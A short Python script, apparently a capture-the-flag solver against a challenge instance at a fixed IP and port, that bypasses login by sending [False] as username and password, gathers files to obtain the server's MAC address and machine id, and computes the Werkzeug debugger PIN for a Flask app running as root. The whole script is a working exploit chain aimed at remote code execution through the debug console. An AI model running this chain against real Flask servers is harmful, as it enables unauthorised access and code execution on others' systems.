from api_functionality import Desynth, resolve_pin

TARGET = "94.237.51.159"
PORT = 30820


def main():
    D = Desynth(TARGET, PORT)
    D.authenticate(username=[False], password=[False])
    mac_address, random_id = D.gather_files()    
    pin = resolve_pin(
        running_user='root',
        path_to_flask='/usr/local/lib/python3.11/site-packages/flask/app.py',
        mac_address=mac_address,
        random_id=random_id
    )
    print(f"Werkzeug pin: {pin}")

if __name__ == "__main__":
    main()